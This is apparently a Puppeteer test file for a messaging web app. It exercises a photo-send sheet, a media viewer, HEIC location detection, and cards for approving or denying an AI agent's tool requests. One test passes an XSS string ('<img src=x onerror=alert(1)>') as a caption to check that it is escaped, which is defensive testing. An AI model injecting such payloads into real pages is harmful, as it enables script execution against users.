  const loadScript = (src) => new Promise((res, rej) => { if (document.querySelector('script[src="' + src + '"]')) { res(); return; } const el2 = document.createElement('script'); el2.src = src; el2.onload = res; el2.onerror = () => rej(new Error('load ' + src)); document.head.append(el2); });
  await loadScript('/assets/js/mentria-meta-strip.js');
  await loadScript('/assets/js/mentria-image.js');
  const SH = await import('/assets/js/comms/sheet.js').catch((e) => ({ openSheet: () => { throw e; } }));
  const TS = { sheet: { title: 'Send', add: 'Add', caption: 'Add a caption', standard: 'Standard', hd: 'HD', send: 'Send', cancel: 'Cancel', est_down: '{n} photos · {size}, downscaled', est_orig: '{size}, originals', est_mixed: '{n} items · {size}, photos downscaled', keeps_location: 'This file keeps its location data', too_big: 'Too big to send: 2 GB at most', remove: 'Remove' } };
  const photos = async (n, w = 1200, h = 900) => { const out = []; const c = document.createElement('canvas'); c.width = w; c.height = h; const g = c.getContext('2d'); for (let k = 0; k < n; k++) { g.fillStyle = 'hsl(' + (k * 37 % 360) + ',60%,50%)'; g.fillRect(0, 0, w, h); g.fillStyle = '#fff'; g.fillRect(k * 10 % w, 10, 50, 50); const b = await new Promise((r) => c.toBlob(r, 'image/jpeg', 0.9)); out.push(new File([b], 'p' + k + '.jpg', { type: 'image/jpeg' })); } return out; };
  const spyBitmaps = () => { const real = window.createImageBitmap; const log = []; log.maxConcurrent = 0; let live = 0; window.createImageBitmap = async (src, opts) => { live += 1; log.maxConcurrent = Math.max(log.maxConcurrent, live); log.push({ resized: !!(opts && (opts.resizeWidth || opts.resizeHeight)) }); try { return await real(src, opts); } finally { live -= 1; } }; log.restore = () => { window.createImageBitmap = real; }; return log; };
  const openWith = async (files, o = {}) => { const h = SH.openSheet({ files, self: !!o.self, T: TS, onSend() {} }); await h.ready; return h; };
  const bigFake = (size) => ({ name: 'huge.bin', size, type: 'application/octet-stream', lastModified: 0, slice: () => new Blob([]) });
  test('sheet: album of 30 decodes small, one at a time', async () => { const files = await photos(30, 4032, 3024); const log = spyBitmaps(); let h = null; try { h = await openWith(files); } finally { log.restore(); } ok(log.length >= 30, 'decoded ' + log.length); ok(log.every((c) => c.resized), 'a full-size decode happened'); eq(log.maxConcurrent, 1); h.close(); });
  test('sheet: no HD switch for my devices', async () => { const h = await openWith(await photos(2), { self: true }); ok(document.querySelector('#comms-sheet .m-seg').hidden); h.close(); });
  test('sheet: over 2 GB is left out', async () => { const h = await openWith([bigFake(2147483649)]); ok(document.querySelector('#comms-sheet [data-act="send"]').disabled); h.close(); });
  const V = await import('/assets/js/comms/viewer.js').catch((e) => ({ openViewer: () => { throw e; }, renderMediaGrid: () => { throw e; } }));
  const TV = { viewer: { save: 'Save', save_now: 'Save now', share: 'Share', share_now: 'Share now', close: 'Close', prev: 'Previous', next: 'Next' }, files: { on_device: '{size} on this device', free_up: 'Free up space', removed: 'Removed from this device' } };
  const vitems = (n) => Array.from({ length: n }, (_, i) => ({ ref: R(60 + i), kind: 'image', name: 'p' + i + '.jpg', mime: 'image/jpeg', w: 320, h: 240 }));
  const key = (k) => document.dispatchEvent(new KeyboardEvent('keydown', { key: k, bubbles: true }));
  const current = () => Number((document.querySelector('#comms-viewer') || {}).dataset ? document.querySelector('#comms-viewer').dataset.index : -1);
  const recs = (n) => Array.from({ length: n }, (_, i) => ({ id: R(80 + i), threadId: 'dm-1', role: 'in', state: 'done', complete: true, size: 4e8, mime: 'image/jpeg', name: 'r' + i + '.jpg', kind: 'image', updatedAt: i }));
  test('viewer: arrows move and Esc closes', async () => { V.openViewer({ items: vitems(3), start: 0, T: TV }); key('ArrowRight'); eq(current(), 1); key('Escape'); ok(!document.querySelector('#comms-viewer[open]')); });
  test('viewer: save hands the photo over instead of linking to it', async () => { const calls = []; const h = V.openViewer({ items: vitems(2), start: 1, T: TV, onSave: (it) => { calls.push(it.ref); return null; } }); try { no(document.querySelector('#comms-viewer a[download]'), 'a download link is still there'); document.querySelector('#comms-viewer [data-act="save"]').click(); await sleep(20); deepEq(calls, [R(61)]); } finally { h.close(); } });
  test('viewer: a big file saves on a second tap', async () => { const f = new File(['x'], 'p0.jpg'); const shared = []; const real = navigator.share; navigator.share = async (d) => { shared.push(d.files[0]); }; const h = V.openViewer({ items: vitems(1), start: 0, T: TV, onSave: () => ({ later: true, file: f }) }); try { const b = document.querySelector('#comms-viewer [data-act="save"]'); b.click(); await sleep(20); eq(b.textContent, 'Save now'); b.click(); await sleep(20); eq(shared[0], f); eq(b.textContent, 'Save'); } finally { h.close(); navigator.share = real; } });
  test('viewer: when save opens the share sheet there is no second share button', () => { const h = V.openViewer({ items: vitems(1), start: 0, T: TV, onSave() {}, onShare() {}, saveOpensSheet: true }); try { ok(document.querySelector('#comms-viewer [data-act="share"]').hidden); ok(!document.querySelector('#comms-viewer [data-act="save"]').hidden); } finally { h.close(); } });
  const withCommsCss = async (fn) => { const html = await (await fetch('/comms/')).text(); const css = [...html.matchAll(/<style>([\s\S]*?)<\/style>/g)].map((m) => m[1]).join('\n'); const st = document.createElement('style'); st.textContent = css; document.head.append(st); try { await fn(); } finally { st.remove(); } };
  test('viewer: a long file name keeps the viewer on screen', async () => { await withCommsCss(async () => { const items = [{ ref: R(70), kind: 'image', name: 'Screenshot '.repeat(30) + '.png', mime: 'image/png' }]; const h = V.openViewer({ items, start: 0, T: TV, onSave() {} }); try { await sleep(20); const d = document.getElementById('comms-viewer'); const w = d.getBoundingClientRect().width; for (const sel of ['.comms__viewer-top', '.comms__viewer-stage', '.comms__viewer-close']) { const r = d.querySelector(sel).getBoundingClientRect(); ok(r.left >= -1 && r.right <= w + 1, sel + ' spans ' + Math.round(r.left) + '..' + Math.round(r.right) + ' in ' + Math.round(w)); } } finally { h.close(); } }); });
  test('viewer: one photo leaves no empty strip', async () => { await withCommsCss(async () => { const h = V.openViewer({ items: vitems(1), start: 0, T: TV }); try { eq(getComputedStyle(document.querySelector('#comms-viewer .comms__viewer-strip')).display, 'none'); } finally { h.close(); } }); });
  test('fix I10: reopening the viewer shares the photo now on screen', async () => { const calls = []; const share = (it) => { calls.push(it.ref); return null; }; let h = V.openViewer({ items: vitems(2), start: 1, T: TV, onShare: share }); h.close(); const second = [{ ref: R(90), kind: 'image', name: 'n.jpg', mime: 'image/jpeg' }]; h = V.openViewer({ items: second, start: 0, T: TV, onShare: share }); document.querySelector('#comms-viewer [data-act="share"]').click(); await sleep(50); h.close(); deepEq(calls, [R(90)]); });
  test('fix I12: the viewer strip and the grid use small previews', () => { const items = vitems(3).map((x) => ({ ...x, thumb: 'QUJD' })); const h = V.openViewer({ items, start: 0, T: TV }); ok([...document.querySelectorAll('#comms-viewer .comms__viewer-thumb img')].every((i) => i.getAttribute('src').startsWith('data:image/jpeg;base64,'))); h.close(); V.renderMediaGrid(el, { media: recs(2).map((r) => ({ ...r, thumb: 'QUJD' })), usage: 1, T: TV }); ok([...el.querySelectorAll('.comms__media-cell img')].every((i) => i.getAttribute('src').startsWith('data:image/jpeg;base64,'))); });
  test('fix C2a: an undecodable HEIC still has its location found', async () => { const be32 = (n) => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255]; const be16 = (n) => [(n >> 8) & 255, n & 255]; const tag = (t) => Array.from(t, (c) => c.charCodeAt(0)); const box = (t, ...p) => { const body = [].concat(...p); return be32(body.length + 8).concat(tag(t), body); }; const full = (t, v, ...p) => box(t, [v, 0, 0, 0], ...p); const ex = tag('Exif\0\0GPS-SECRET'); const infe = full('infe', 2, be16(1), be16(0), tag('Exif'), [0]); const iinf = full('iinf', 0, be16(1), infe); const ftyp = box('ftyp', tag('heic'), [0, 0, 0, 0], tag('heic')); const body = (off) => box('hdlr', new Array(24).fill(0)).concat(iinf, full('iloc', 0, [0x44, 0x40], be16(1), be16(1), be16(0), be32(0), be16(1), be32(off), be32(ex.length))); const metaLen = 12 + body(0).length; const off = ftyp.length + metaLen + 8; const bytes = new Uint8Array(ftyp.concat(full('meta', 0, body(off)), box('mdat', ex))); let sent = null; const h = SH.openSheet({ files: [new File([bytes], 'p.heic', { type: 'image/heic' })], self: false, T: TS, onSend: (r) => { sent = r; } }); await h.ready; document.querySelector('#comms-sheet [data-act="send"]').click(); ok(sent && sent.items[0].ranges && sent.items[0].ranges.length === 1, JSON.stringify(sent && sent.items[0])); });
  test('grid: usage line and free up space', () => { V.renderMediaGrid(el, { media: recs(4), usage: 1.6e9, T: TV, onOpen() {}, onFree() {} }); eq(el.querySelector('.comms__media-usage').textContent, '1.6 GB on this device'); ok(el.querySelector('[data-act="free"]')); });
  test('a caption is plain text, never HTML', () => { C.renderParts(el, [{ type: 'text', text: '<img src=x onerror=alert(1)>' }, album(1)], opts()); eq(el.querySelectorAll('img[onerror]').length, 0); });

  const permDom = () => {
    const card = document.createElement('div');
    card.id = 'comms-agent-perm';
    card.hidden = true;
    card.innerHTML = '<p id="comms-agent-perm-title"></p><p id="comms-agent-perm-desc"></p><pre id="comms-agent-perm-preview"></pre><p id="comms-agent-perm-note" hidden></p><div id="comms-agent-perm-actions"><button id="comms-agent-deny" type="button">Deny</button><button id="comms-agent-allow" type="button">Allow</button></div>';
    document.body.append(card);
    return card;
  };
  const TP = { agent: { wants: '{tool} wants to run', message: 'Message the {name}', sent: 'sent', delivered: 'delivered', unpaired: 'not delivered', ask_send: 'Send answer', ask_other: 'Or type' }, cc: { local: 'Answer this at the computer.', answered_here: 'Answered at the computer.', clock: 'Not delivered: check this device clock.', unpaired: 'Not delivered: not on the list.', command: 'Not run: slash commands only run at the computer.' }, chat: {} };
  const agentRig = async () => {
    const AVx = await import('/assets/js/comms/agent-view.js?' + Math.random());
    const mkEl = (tag) => document.createElement(tag || 'div');
    const els = { log: mkEl(), chatTitle: mkEl('span'), chatAvatar: mkEl('span'), status: mkEl('span'), leave: mkEl('button'), peers: mkEl(), enc: mkEl(), callStart: mkEl('button'), share: mkEl('button'), msg: mkEl('input'), go: mkEl('button') };
    const handlers = {};
    const verdicts = [];
    const client = { on: (t, fn) => { handlers[t] = fn; return () => {}; }, sessions: () => [{ sid: 's', online: true }], turns: () => [], turn: () => null, hello() {}, watch() {}, list() {}, open() {}, get() {}, channel: () => true, reset() {}, say: async () => 'p:1', verdict: async (...a) => { verdicts.push(a); return 'v:1'; }, answer: async () => 'a:1' };
    const card = permDom();
    const v = AVx.createAgentView({ els, T: TP, client });
    v.open('s', null, 'S');
    return { v, els, handlers, verdicts, card, done: () => { v.close(); card.remove(); } };
  };
  test('cards: verdict echoes the perm call id and hash', async () => {
    const r = await agentRig();
    r.handlers.perm({ t: 'perm', sid: 's', request_id: 'r1', tool_name: 'Bash', description: 'd', input_preview: 'npm test', call: { id: 'r1', hash: 'HASH1' }, ts: Date.now() });
    await sleep(50);
    eq(r.card.hidden, false);
    document.getElementById('comms-agent-allow').click();
    await sleep(20);
    deepEq(r.verdicts, [['s', 'r1', 'allow', { id: 'r1', hash: 'HASH1' }]]);
    r.done();
  });
  test('cards: local perm shows answer-at-computer and no buttons', async () => {
    const r = await agentRig();
    r.handlers.perm({ t: 'perm', sid: 's', request_id: 'r2', tool_name: 'Edit', input_preview: '.claude/settings.json', call: { id: 'r2', hash: 'H' }, local: true, ts: Date.now() });
    await sleep(50);
    eq(r.card.hidden, false);
    eq(document.getElementById('comms-agent-perm-note').hidden, false);
    eq(document.getElementById('comms-agent-perm-note').textContent, 'Answer this at the computer.');
    eq(document.getElementById('comms-agent-perm-actions').hidden, true);
    r.done();
  });
  test('cards: resolved replaces the buttons with answered-at-computer', async () => {
    const r = await agentRig();
    r.handlers.perm({ t: 'perm', sid: 's', request_id: 'r3', tool_name: 'Bash', input_preview: 'ls', call: { id: 'r3', hash: 'H' }, ts: Date.now() });
    await sleep(50);
    r.handlers.resolved({ t: 'resolved', sid: 's', request_id: 'r3', where: 'computer' });
    await sleep(50);
    eq(document.getElementById('comms-agent-perm-note').textContent, 'Answered at the computer.');
    eq(document.getElementById('comms-agent-perm-actions').hidden, true);
    r.done();
  });
  test('cards: err clock and unpaired show their notes', async () => {
    const r = await agentRig();
    const c1 = await r.v.say('one');
    r.handlers.err({ t: 'err', sid: 's', cmid: 'p:1', code: 'clock' });
    await sleep(100);
    ok(r.els.log.textContent.includes('Not delivered: check this device clock.'), r.els.log.textContent);
    r.done();
    const r2 = await agentRig();
    await r2.v.say('two');
    r2.handlers.err({ t: 'err', sid: 's', cmid: 'p:1', code: 'unpaired' });
    await sleep(100);
    ok(r2.els.log.textContent.includes('Not delivered: not on the list.'), r2.els.log.textContent);
    r2.done();
    const r3 = await agentRig();
    await r3.v.say('/model x');
    r3.handlers.err({ t: 'err', sid: 's', cmid: 'p:1', code: 'command' });
    await sleep(100);
    ok(r3.els.log.textContent.includes('Not run: slash commands only run at the computer.'), r3.els.log.textContent);
    r3.done();
  });

  test('cards: a verdict refused for clock comes back with the note', async () => {
    const r = await agentRig();
    r.handlers.perm({ t: 'perm', sid: 's', request_id: 'r9', tool_name: 'Bash', input_preview: 'ls', call: { id: 'r9', hash: 'H' }, ts: Date.now() });
    await sleep(50);
    document.getElementById('comms-agent-allow').click();
    await sleep(30);
    r.handlers.err({ t: 'err', sid: 's', cmid: 'v:1', code: 'clock' });
    await sleep(50);
    eq(r.card.hidden, false);
    eq(document.getElementById('comms-agent-perm-note').textContent, 'Not delivered: check this device clock.');
    eq(document.getElementById('comms-agent-perm-actions').hidden, false);
    r.done();
  });

  const out = [];
  for (const [name, fn] of tests) {
    el = document.createElement('div');
    document.body.append(el);
    try { await fn(); out.push({ name, ok: true }); } catch (e) { out.push({ name, ok: false, err: String(e && e.message || e) }); }
    el.remove();
  }
  return out;
};

const server = await serve(BUILD, PORT);
const browser = await puppeteer.launch({ executablePath: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', headless: true, userDataDir: PROFILE, args: ['--no-first-run', '--no-default-browser-check'] });
let results = [];
try {
  const page = await browser.newPage();
  await page.goto(ORIGIN + '/__render-check.html');
  results = await page.evaluate(PAGE_TESTS).catch((e) => [{ name: 'load the renderer', ok: false, err: String(e && e.message || e).split('\n')[0] }]);
} finally {
  await browser.close();
  server.close();
  rmSync(PROFILE, { recursive: true, force: true });
}
let failed = 0;
for (const r of results) {
  if (r.ok) console.log('PASS ' + r.name);
  else { failed++; console.log('FAIL ' + r.name + ': ' + r.err); }
}
console.log('comms render: ' + (results.length - failed) + '/' + results.length + ' passed');
process.exit(failed || !results.length ? 1 : 0);
